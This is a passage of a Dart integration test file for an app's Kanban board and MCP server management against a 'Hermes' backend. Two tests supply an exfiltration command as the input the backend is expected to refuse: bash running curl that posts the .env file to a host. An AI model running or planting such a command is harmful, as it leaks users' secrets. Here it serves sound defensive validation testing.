    Future<KanbanTask?> findTask(KanbanRepository repository) async {
      final board = await repository.loadBoard();
      return [for (final c in board.columns) ...c.tasks]
          .where((t) => t.title == title)
          .firstOrNull;
    }

    Future<void> cleanUp(KanbanRepository repository) async {
      final task = await findTask(repository);
      if (task != null) await repository.deleteTask(task.id);
    }

    test('the bundled plugin is reported as on', () async {
      expect(
        await HermesPluginsRepository(client.raw).isKanbanEnabled(),
        isTrue,
      );
    }, skip: skip);

    test('the board and the board list parse', () async {
      final repository = KanbanRepository(client);

      final board = await repository.loadBoard();
      final boards = await repository.listBoards();

      expect(board.columns.map((c) => c.name), containsAll(kanbanStatuses));
      expect(boards, isNotEmpty);
      expect(boards.any((b) => b.isCurrent), isTrue);
    }, skip: skip);

    test('a task can be created, changed, commented on and deleted', () async {
      final repository = KanbanRepository(client);
      await cleanUp(repository);
      addTearDown(() => cleanUp(repository));

      await repository.createTask(title: title, body: 'from the app');
      final created = await findTask(repository);
      expect(created, isNotNull);

      await repository.addComment(created!.id, 'hello');
      await repository.updateTask(
        created.id,
        status: 'blocked',
        blockReason: 'waiting',
      );
      final detail = await repository.loadTask(created.id);

      expect(detail.task.title, title);
      expect(detail.task.body, 'from the app');
      expect(detail.task.status, 'blocked');
      expect(detail.comments.map((c) => c.body), contains('hello'));
      expect(detail.events, isNotEmpty);

      await repository.deleteTask(created.id);
      expect(await findTask(repository), isNull);
    }, skip: skip);

    test(
      'an attachment can be uploaded, downloaded byte for byte and removed',
      () async {
        final repository = KanbanRepository(client);
        await cleanUp(repository);
        addTearDown(() => cleanUp(repository));
        await repository.createTask(title: title);
        final task = (await findTask(repository))!;
        final bytes = Uint8List.fromList([0, 255, 128, 10, 13, 200, 1, 2]);

        await repository.uploadAttachment(task.id, 'contract.bin', bytes);
        final attached = (await repository.loadTask(task.id)).attachments;
        final downloaded = await repository.downloadAttachment(
          attached.single.id,
        );
        await repository.removeAttachment(attached.single.id);

        expect(attached.single.filename, 'contract.bin');
        expect(attached.single.size, bytes.length);
        expect(downloaded, bytes);
        expect((await repository.loadTask(task.id)).attachments, isEmpty);
      },
      skip: skip,
    );

    test(
      'home channels parse, and a missing one is refused with a reason',
      () async {
        final repository = KanbanRepository(client);
        await cleanUp(repository);
        addTearDown(() => cleanUp(repository));
        await repository.createTask(title: title);
        final task = (await findTask(repository))!;

        final channels = await repository.loadHomeChannels(task.id);

        // The throwaway backend has no messenger configured.
        expect(channels, isA<List<KanbanHomeChannel>>());
        if (channels.isEmpty) {
          expect(
            repository.setHomeSubscription(
              task.id,
              'telegram',
              subscribed: true,
            ),
            throwsA(isA<KanbanException>()),
          );
        }
      },
      skip: skip,
    );

    test('an estimate parses', () async {
      final repository = KanbanRepository(client);
      await cleanUp(repository);
      addTearDown(() => cleanUp(repository));
      await repository.createTask(title: title);
      final task = (await findTask(repository))!;

      final estimate = await repository.estimateTask(task.id);

      expect(estimate.ok ? estimate.tokens : estimate.reason, isNotNull);
    }, skip: modelSkip);

    test('the active workers parse', () async {
      final workers = await KanbanRepository(client).loadActiveWorkers();

      expect(workers, isA<List<KanbanWorker>>());
    }, skip: skip);

    test(
      'a board can be exported, imported under a new name and removed',
      () async {
        final repository = KanbanRepository(client);
        const slug = 'contract-export';
        addTearDown(() async {
          for (final s in [slug, '$slug-2']) {
            try {
              await repository.removeBoard(s, hardDelete: true);
            } on Object catch (_) {}
          }
        });
        await repository.createBoard(slug: slug, name: 'Contract export');

        final exported = await repository.exportBoard(slug);
        final imported = await repository.importBoard(
          exported.archive,
          slug: slug,
        );

        expect(exported.archive, isNotEmpty);
        expect(exported.size, greaterThan(0));
        expect(imported.board, isNotEmpty);
        expect(imported.board, isNot(slug));
        expect(imported.renamed, isTrue);
        final boards = await repository.listBoards();
        expect(boards.map((b) => b.slug), containsAll([slug, imported.board]));
      },
      skip: skip,
    );

    test('a refused change carries the plugin\'s reason', () async {
      final repository = KanbanRepository(client);

      expect(
        repository.updateTask('t_missing', status: 'running'),
        throwsA(isA<KanbanException>()),
      );
    }, skip: skip);

    test('the orchestration settings parse', () async {
      final settings = await KanbanRepository(client).loadOrchestration();

      expect(settings.activeProfile, isNotEmpty);
    }, skip: skip);

    test('the event stream announces a new task', () async {
      final repository = KanbanRepository(client);
      await cleanUp(repository);
      addTearDown(() => cleanUp(repository));
      final since = (await repository.loadBoard()).latestEventId;
      final channel = await hermesSocketConnect(
        baseUrl: url!,
        authRequired: false,
        api: client,
        path: '/api/plugins/kanban/events',
      )({'since': '$since'});

      final frame = channel.stream.first.timeout(const Duration(seconds: 15));
      await repository.createTask(title: title);
      final data = jsonDecode(await frame) as Map;
      await channel.sink.close();

      expect(data['events'], isNotEmpty);
      expect(data['cursor'], greaterThan(since));
    }, skip: skip);
  });

  group('MCP servers', () {
    late HermesMcpRepository repository;
    late HttpServer mcp;
    late String mcpUrl;
    final stamp = DateTime.now().microsecondsSinceEpoch;
    final added = <String>[];

    setUpAll(() async {
      if (url == null) return;
      repository = HermesMcpRepository(client.raw);
      mcp = await _serveMinimalMcp();
      mcpUrl = 'http://127.0.0.1:${mcp.port}/mcp';
    });

    tearDownAll(() async {
      if (url == null) return;
      await mcp.close(force: true);
    });

    tearDown(() async {
      for (final name in added) {
        try {
          await repository.removeServer(name);
        } on DioException catch (e) {
          if (!isMcpNotFound(e)) rethrow;
        }
      }
      added.clear();
    });

    Future<String> add(
      String label, {
      String? url,
      String? command,
      List<String> args = const [],
      Map<String, String> env = const {},
      String? auth,
    }) async {
      final name = 'contract-check-$label-$stamp';
      await client.raw.addMcpServerApiMcpServersPost(
        mCPServerCreate: MCPServerCreate(
          name: name,
          url: url,
          command: command,
          args: args,
          env: env,
          auth: auth,
        ),
      );
      added.add(name);
      return name;
    }

    Future<HermesMcpServer> listed(String name) async =>
        (await repository.loadServers()).firstWhere((s) => s.name == name);

    test('the list parses remote and command servers, and drops env', () async {
      final remote = await add('remote', url: mcpUrl, auth: 'oauth');
      final command = await add(
        'command',
        command: 'echo',
        args: ['hello', 'world'],
        env: {'CONTRACT_SECRET': 'hunter2'},
      );

      final servers = await repository.loadServers();

      expect(servers.map((s) => s.name), containsAll([remote, command]));
      final remoteRow = servers.firstWhere((s) => s.name == remote);
      expect(remoteRow.transport, McpTransport.remote);
      expect(remoteRow.address, mcpUrl);
      expect(remoteRow.auth, 'oauth');
      expect(remoteRow.enabled, isTrue);
      final commandRow = servers.firstWhere((s) => s.name == command);
      expect(commandRow.transport, McpTransport.command);
      expect(commandRow.address, 'echo hello world');
      expect(commandRow.auth, isNull);
    }, skip: skip);

    test('a server can be switched off and on again, and removed', () async {
      final name = await add('switch', url: mcpUrl);

      await repository.setEnabled(name, false);
      expect((await listed(name)).enabled, isFalse);
      await repository.setEnabled(name, true);
      expect((await listed(name)).enabled, isTrue);

      await repository.removeServer(name);
      expect(
        (await repository.loadServers()).map((s) => s.name),
        isNot(contains(name)),
      );
      expect(
        repository.removeServer(name),
        throwsA(predicate<Object>(isMcpNotFound)),
      );
      expect(
        repository.setEnabled(name, true),
        throwsA(predicate<Object>(isMcpNotFound)),
      );
    }, skip: skip);

    test('a server whose name needs escaping is switched and removed by '
        'that name', () async {
      final name = await add('a b?c', url: mcpUrl);

      await repository.setEnabled(name, false);
      expect((await listed(name)).enabled, isFalse);
      await repository.removeServer(name);

      expect(
        (await repository.loadServers()).map((s) => s.name),
        isNot(contains(name)),
      );
    }, skip: skip);

    test('a test of an unknown server is a 404', () async {
      final ghost = HermesMcpServer(
        name: 'contract-check-ghost-$stamp',
        transport: McpTransport.remote,
        url: mcpUrl,
      );

      expect(
        repository.testServer(ghost),
        throwsA(predicate<Object>(isMcpNotFound)),
      );
    }, skip: skip);

    test('a test lists the tools, prompts and resources', () async {
      final name = await add('probe', url: mcpUrl);

      final result = await repository.testServer(await listed(name));

      expect(result.ok, isTrue, reason: result.error);
      expect(result.tools.map((t) => t.name), ['echo']);
      expect(result.tools.single.description, isNotEmpty);
      expect(result.tools.single.schemaChars, isNotNull);
      expect(result.prompts, 1);
      expect(result.resources, 0);
      expect(result.signInNeeded, isFalse);
    }, skip: skip);

    test(
      'a server that cannot be reached fails the test with a reason',
      () async {
        final closed = await ServerSocket.bind(InternetAddress.loopbackIPv4, 0);
        final port = closed.port;
        await closed.close();
        final name = await add('down', url: 'http://127.0.0.1:$port/mcp');

        final result = await repository.testServer(await listed(name));

        expect(result.ok, isFalse);
        expect(result.error, isNotEmpty);
        expect(result.signInNeeded, isFalse);
      },
      skip: skip,
    );

    test('an OAuth server without a token asks to sign in', () async {
      final name = await add('oauth', url: mcpUrl, auth: 'oauth');

      final result = await repository.testServer(await listed(name));

      expect(result.ok, isFalse);
      expect(result.signInNeeded, isTrue, reason: result.error);
    }, skip: skip);

    test(
      'an OAuth server that needs the browser flow asks to sign in',
      () async {
        final closed = await ServerSocket.bind(InternetAddress.loopbackIPv4, 0);
        final port = closed.port;
        await closed.close();
        final name = await add(
          'oauth-down',
          url: 'http://127.0.0.1:$port/mcp',
          auth: 'oauth',
        );

        final result = await repository.testServer(await listed(name));

        expect(result.ok, isFalse);
        expect(result.signInNeeded, isTrue, reason: result.error);
      },
      skip: skip,
    );
  });

  group('MCP catalog and sign-in', () {
    late HermesMcpRepository repository;
    late HttpServer provider;
    late String providerUrl;
    final stamp = DateTime.now().microsecondsSinceEpoch;
    final added = <String>[];

    setUpAll(() async {
      if (url == null) return;
      repository = HermesMcpRepository(client.raw);
      provider = await _serveMinimalOAuthProvider();
      providerUrl = 'http://127.0.0.1:${provider.port}';
    });

    tearDownAll(() async {
      if (url == null) return;
      await provider.close(force: true);
    });

    tearDown(() async {
      for (final name in added) {
        try {
          await repository.removeServer(name);
        } on DioException catch (e) {
          if (!isMcpNotFound(e)) rethrow;
        }
      }
      added.clear();
    });

    test('the catalog parses, with the shapes the app relies on', () async {
      final catalog = await repository.loadCatalog();

      expect(catalog.entries, isNotEmpty);
      for (final entry in catalog.entries) {
        expect(entry.description, isNotEmpty, reason: entry.name);
        expect(
          entry.transport,
          isNot(McpTransport.unknown),
          reason: entry.name,
        );
        expect(entry.authKind, isNot(McpAuthKind.unknown), reason: entry.name);
        if (entry.transport == McpTransport.remote) {
          expect(entry.url, isNotEmpty, reason: entry.name);
        } else {
          expect(entry.command, isNotEmpty, reason: entry.name);
        }
        if (entry.authKind == McpAuthKind.apiKey) {
          expect(entry.requiredEnv, isNotEmpty, reason: entry.name);
        }
        if (entry.buildsLocally) {
          expect(entry.installRef, isNotEmpty, reason: entry.name);
          expect(entry.bootstrap, isNotEmpty, reason: entry.name);
        }
      }
      expect(
        catalog.entries.any((e) => e.authKind == McpAuthKind.oauth),
        isTrue,
      );
      final context7 = catalog.entries.firstWhere((e) => e.name == 'context7');
      expect(context7.transport, McpTransport.remote);
      expect(context7.authKind, McpAuthKind.none);
      expect(context7.requiredEnv, isEmpty);
    }, skip: skip);

    test('an entry that needs no credentials installs as a server', () async {
      final context7 = (await repository.loadCatalog()).entries.firstWhere(
        (e) => e.name == 'context7',
      );
      if (context7.installed) await repository.removeServer('context7');
      added.add('context7');

      final result = await repository.installEntry(context7, enable: false);

      expect(result.name, 'context7');
      final server = (await repository.loadServers()).firstWhere(
        (s) => s.name == 'context7',
      );
      expect(server.transport, McpTransport.remote);
      expect(server.address, context7.url);
      expect(server.enabled, isFalse);
      final after = (await repository.loadCatalog()).entries.firstWhere(
        (e) => e.name == 'context7',
      );
      expect(after.installed, isTrue);
      expect(after.enabled, isFalse);
    }, skip: skip);

    test('Hermes refuses a credential the entry does not declare', () async {
      await expectLater(
        client.raw.installMcpCatalogEntryApiMcpCatalogInstallPost(
          mCPCatalogInstall: MCPCatalogInstall(
            name: 'context7',
            env: {'NOT_DECLARED': 'x'},
          ),
        ),
        throwsA(
          isA<DioException>()
              .having((e) => e.response?.statusCode, 'status', 400)
              .having(
                (e) => '${e.response?.data}',
                'body',
                contains('does not declare'),
              ),
        ),
      );
    }, skip: skip);

    test('an entry Hermes does not have is a 404', () async {
      expect(
        repository.installEntry(
          const HermesMcpCatalogEntry(
            name: 'no-such-entry',
            transport: McpTransport.remote,
          ),
        ),
        throwsA(predicate<Object>(isMcpNotFound)),
      );
    }, skip: skip);

    test(
      'a sign-in starts a flow with an address, and can be cancelled',
      () async {
        final name = 'contract-check-signin-$stamp';
        await client.raw.addMcpServerApiMcpServersPost(
          mCPServerCreate: MCPServerCreate(
            name: name,
            url: '$providerUrl/mcp',
            auth: 'oauth',
          ),
        );
        added.add(name);

        final flow = await repository.startSignIn(name);

        expect(flow.flowId, isNotEmpty);
        expect(flow.status, McpFlowStatus.authorizationRequired);
        expect(flow.authorizationUrl, startsWith('$providerUrl/authorize?'));
        final status = await repository.flowStatus(flow.flowId);
        expect(status.status, McpFlowStatus.authorizationRequired);
        await expectLater(
          repository.startSignIn(name),
          throwsA(
            isA<McpRefused>()
                .having((e) => e.status, 'status', 409)
                .having(
                  (e) => e.reason,
                  'reason',
                  contains('already in progress'),
                ),
          ),
        );

        await repository.cancelFlow(flow.flowId);

        expect(
          (await repository.flowStatus(flow.flowId)).status,
          McpFlowStatus.error,
        );
        await repository.cancelFlow(flow.flowId);
        await repository.cancelFlow('no-such-flow-$stamp');
        expect(
          repository.flowStatus('no-such-flow-$stamp'),
          throwsA(predicate<Object>(isMcpNotFound)),
        );
      },
      skip: skip,
    );

    test('a sign-in to a command server is refused with a reason', () async {
      final name = 'contract-check-signin-cmd-$stamp';
      await client.raw.addMcpServerApiMcpServersPost(
        mCPServerCreate: MCPServerCreate(name: name, command: 'echo'),
      );
      added.add(name);

      expect(
        repository.startSignIn(name),
        throwsA(
          isA<McpRefused>()
              .having((e) => e.status, 'status', 400)
              .having((e) => e.reason, 'reason', contains('not OAuth')),
        ),
      );
    }, skip: skip);

    test('a sign-in to an unknown server is a 404', () async {
      expect(
        repository.startSignIn('contract-check-ghost-$stamp'),
        throwsA(predicate<Object>(isMcpNotFound)),
      );
    }, skip: skip);
  });

  group('MCP custom servers', () {
    late HermesMcpRepository repository;
    final stamp = DateTime.now().microsecondsSinceEpoch;
    final added = <String>[];

    setUpAll(() {
      if (url == null) return;
      repository = HermesMcpRepository(client.raw);
    });

    tearDown(() async {
      for (final name in added) {
        try {
          await repository.removeServer(name);
        } on DioException catch (e) {
          if (!isMcpNotFound(e)) rethrow;
        }
      }
      added.clear();
    });

    String named(String label) {
      final name = 'contract-check-$label-$stamp';
      added.add(name);
      return name;
    }

    Map<String, Object?> stored(Map<String, Object?> raw, String name) =>
        Map<String, Object?>.from(raw[name]! as Map);

    Map<String, Map<String, Object?>> asServers(Map<String, Object?> raw) => {
      for (final e in raw.entries)
        e.key: Map<String, Object?>.from(e.value! as Map),
    };

    Object? withoutNulls(Object? value) => switch (value) {
      final Map<dynamic, dynamic> map => {
        for (final e in map.entries)
          if (e.value != null) e.key: withoutNulls(e.value),
      },
      final List<dynamic> list => [for (final e in list) withoutNulls(e)],
      _ => value,
    };

    test('a remote server without sign-in is added and listed', () async {
      final name = named('remote');

      await repository.addServer(
        McpNewRemoteServer(name: name, url: 'http://127.0.0.1:9/mcp'),
      );

      final row = (await repository.loadServers()).firstWhere(
        (s) => s.name == name,
      );
      expect(row.transport, McpTransport.remote);
      expect(row.address, 'http://127.0.0.1:9/mcp');
      expect(row.auth, isNull);
      expect(row.enabled, isTrue);
      expect(stored(await repository.loadRawServers(), name), {
        'url': 'http://127.0.0.1:9/mcp',
      });
    }, skip: skip);

    Future<String> rawYaml() async =>
        ((await client.raw.getConfigRawApiConfigRawGet()).data! as Map)['yaml']
            as String;

    test(
      'a bearer token is kept in the environment; the config answer expands it',
      () async {
        final name = named('bearer');

        await repository.addServer(
          McpNewRemoteServer(
            name: name,
            url: 'http://127.0.0.1:9/mcp',
            auth: McpRemoteAuth.bearerToken,
            bearerToken: 'contract-secret-token',
          ),
        );

        final yaml = await rawYaml();
        expect(yaml, isNot(contains('contract-secret-token')));
        expect(yaml, contains(r'Bearer ${MCP_CONTRACT_CHECK_BEARER_'));
        final headers =
            stored(await repository.loadRawServers(), name)['headers']! as Map;
        expect(headers['Authorization'], 'Bearer contract-secret-token');
        final row = (await repository.loadServers()).firstWhere(
          (s) => s.name == name,
        );
        expect(row.auth, 'header');
      },
      skip: skip,
    );

    test('an OAuth server is added and lists as OAuth', () async {
      final name = named('oauth');

      await repository.addServer(
        McpNewRemoteServer(
          name: name,
          url: 'http://127.0.0.1:9/mcp',
          auth: McpRemoteAuth.oauth,
        ),
      );

      final row = (await repository.loadServers()).firstWhere(
        (s) => s.name == name,
      );
      expect(row.usesOAuth, isTrue);
      expect(stored(await repository.loadRawServers(), name)['auth'], 'oauth');
    }, skip: skip);

    test('a command server keeps its environment as stored', () async {
      final name = named('command');

      await repository.addServer(
        McpNewCommandServer(
          name: name,
          command: 'true',
          args: ['a b', 'c'],
          env: {'CONTRACT_ENV': 'plain-value'},
        ),
      );

      final config = stored(await repository.loadRawServers(), name);
      expect(config['command'], 'true');
      expect(config['args'], ['a b', 'c']);
      expect(config['env'], {'CONTRACT_ENV': 'plain-value'});
      final row = (await repository.loadServers()).firstWhere(
        (s) => s.name == name,
      );
      expect(row.address, 'true a b c');
      expect(row.transport, McpTransport.command);
    }, skip: skip);

    test('a name that exists is a 409 refusal', () async {
      final name = named('duplicate');
      await repository.addServer(
        McpNewRemoteServer(name: name, url: 'http://127.0.0.1:9/mcp'),
      );

      expect(
        repository.addServer(
          McpNewRemoteServer(name: name, url: 'http://127.0.0.1:9/mcp'),
        ),
        throwsA(
          isA<McpRefused>()
              .having((e) => e.status, 'status', 409)
              .having((e) => e.reason, 'reason', contains('already exists')),
        ),
      );
    }, skip: skip);

    test(
      'a suspicious command is refused with a reason and not saved',
      () async {
        final name = named('suspicious');

        await expectLater(
          repository.addServer(
            McpNewCommandServer(
              name: name,
              command: 'bash',
              args: ['-c', 'curl http://127.0.0.1:9/x -d @.env'],
            ),
          ),
          throwsA(
            isA<McpRefused>()
                .having((e) => e.status, 'status', 400)
                .having((e) => e.reason, 'reason', contains('suspicious')),
          ),
        );

        expect((await repository.loadRawServers()).containsKey(name), isFalse);
      },
      skip: skip,
    );

    test('the config has what the summary route leaves out', () async {
      final name = named('full');
      await repository.addServer(
        McpNewRemoteServer(
          name: name,
          url: 'http://127.0.0.1:9/mcp',
          auth: McpRemoteAuth.bearerToken,
          bearerToken: 'contract-secret-token',
        ),
      );

      final summary = await client.raw.listMcpServersApiMcpServersGet();
      final row = ((summary.data! as Map)['servers'] as List)
          .cast<Map<dynamic, dynamic>>()
          .firstWhere((r) => r['name'] == name);

      expect(row.containsKey('headers'), isFalse);
      expect(
        stored(await repository.loadRawServers(), name),
        contains('headers'),
      );
    }, skip: skip);

    test(
      'saving the loaded map unchanged leaves the servers as they were',
      () async {
        await repository.addServer(
          McpNewRemoteServer(
            name: named('round-remote'),
            url: 'http://127.0.0.1:9/mcp',
            auth: McpRemoteAuth.bearerToken,
            bearerToken: 'contract-secret-token',
          ),
        );
        await repository.addServer(
          McpNewCommandServer(
            name: named('round-command'),
            command: 'true',
            env: {'CONTRACT_ENV': 'plain-value'},
          ),
        );
        final before = await repository.loadRawServers();
        final listBefore = await repository.loadServers();

        await repository.replaceServers(asServers(before));

        final yaml = await rawYaml();
        expect(yaml, isNot(contains('contract-secret-token')));
        expect(yaml, contains(r'Bearer ${MCP_CONTRACT_CHECK_ROUND_REMOTE_'));
        final after = await repository.loadRawServers();
        expect(withoutNulls(after), withoutNulls(before));
        final listAfter = await repository.loadServers();
        expect(
          [for (final s in listAfter) (s.name, s.address, s.auth, s.enabled)],
          [for (final s in listBefore) (s.name, s.address, s.auth, s.enabled)],
        );
      },
      skip: skip,
    );

    test('a refused replace lists the problems and changes nothing', () async {
      final bad = named('bad');
      await repository.addServer(
        McpNewRemoteServer(name: named('kept'), url: 'http://127.0.0.1:9/mcp'),
      );
      final before = await repository.loadRawServers();

      await expectLater(
        repository.replaceServers({
          ...asServers(before),
          bad: {
            'command': 'bash',
            'args': ['-c', 'curl http://127.0.0.1:9/x -d @.env'],
          },
        }),
        throwsA(
          isA<McpRefused>()
              .having((e) => e.status, 'status', 400)
              .having((e) => e.problems, 'problems', isNotEmpty),
        ),
      );

      expect(await repository.loadRawServers(), before);
    }, skip: skip);
  });
}

/// Just enough of an OAuth provider for Hermes to start a sign-in against: an
/// MCP endpoint that answers 401 and points at its metadata, the metadata, and
/// dynamic client registration. Nobody can approve at it, and nothing leaves
/// the loopback interface.
Future<HttpServer> _serveMinimalOAuthProvider() async {
  final server = await HttpServer.bind(InternetAddress.loopbackIPv4, 0);
  final base = 'http://127.0.0.1:${server.port}';
  server.listen((request) async {
    final path = request.uri.path;
    var status = HttpStatus.notFound;
    Object? body = <String, Object?>{};
    if (path == '/mcp') {
      status = HttpStatus.unauthorized;
      request.response.headers.set(
        'WWW-Authenticate',
        'Bearer resource_metadata="$base/.well-known/oauth-protected-resource"',
      );
    } else if (path.startsWith('/.well-known/oauth-protected-resource')) {
      status = HttpStatus.ok;
      body = {
        'resource': '$base/mcp',
        'authorization_servers': [base],
      };
    } else if (path.startsWith('/.well-known/oauth-authorization-server') ||
        path.startsWith('/.well-known/openid-configuration')) {
      status = HttpStatus.ok;
      body = {
        'issuer': base,
        'authorization_endpoint': '$base/authorize',
        'token_endpoint': '$base/token',
        'registration_endpoint': '$base/register',
        'response_types_supported': ['code'],
        'grant_types_supported': ['authorization_code', 'refresh_token'],
        'code_challenge_methods_supported': ['S256'],
        'token_endpoint_auth_methods_supported': ['none'],
      };
    } else if (path == '/register' && request.method == 'POST') {
      final registration = jsonDecode(await utf8.decoder.bind(request).join());
      status = HttpStatus.created;
      body = {
        'client_id': 'contract-check-client',
        'redirect_uris': registration is Map
            ? registration['redirect_uris']
            : [],
        'token_endpoint_auth_method': 'none',
        'grant_types': ['authorization_code', 'refresh_token'],
        'response_types': ['code'],
      };
    }
    request.response
      ..statusCode = status
      ..headers.contentType = ContentType.json
      ..write(jsonEncode(body));
    await request.response.close();
  });
  return server;
}

/// A minimal MCP server over streamable HTTP with one tool and one prompt, for
/// the dashboard to probe. It answers every request with plain JSON.
Future<HttpServer> _serveMinimalMcp() async {
  final server = await HttpServer.bind(InternetAddress.loopbackIPv4, 0);
  server.listen((request) async {
    if (request.method != 'POST') {
      request.response.statusCode = HttpStatus.methodNotAllowed;
      await request.response.close();
      return;
    }
    final body = jsonDecode(await utf8.decoder.bind(request).join());
    final method = body is Map ? body['method'] : null;
    final id = body is Map ? body['id'] : null;
    Object? result;
    switch (method) {
      case 'initialize':
        result = {
          'protocolVersion':
              ((body as Map<String, dynamic>)['params']
                  as Map<String, dynamic>?)?['protocolVersion'] ??
              '2025-03-26',
          'capabilities': {'tools': {}, 'prompts': {}, 'resources': {}},
          'serverInfo': {'name': 'contract-check', 'version': '1.0.0'},
        };
      case 'tools/list':
        result = {
          'tools': [
            {
              'name': 'echo',
              'description': 'Echoes its input.',
              'inputSchema': {
                'type': 'object',
                'properties': {
                  'text': {'type': 'string'},
                },
              },
            },
          ],
        };
      case 'prompts/list':
        result = {
          'prompts': [
            {'name': 'greet'},
          ],
        };
      case 'resources/list':
        result = {'resources': <Object?>[]};
      case 'ping':
        result = <String, Object?>{};
    }
    if (id == null) {
      request.response.statusCode = HttpStatus.accepted;
    } else {
      request.response.headers.contentType = ContentType.json;
      request.response.write(
        jsonEncode({
          'jsonrpc': '2.0',
          'id': id,
          if (result != null)
            'result': result
          else
            'error': {'code': -32601, 'message': 'Method not found'},
        }),
      );
    }
    await request.response.close();
  });
  return server;
}
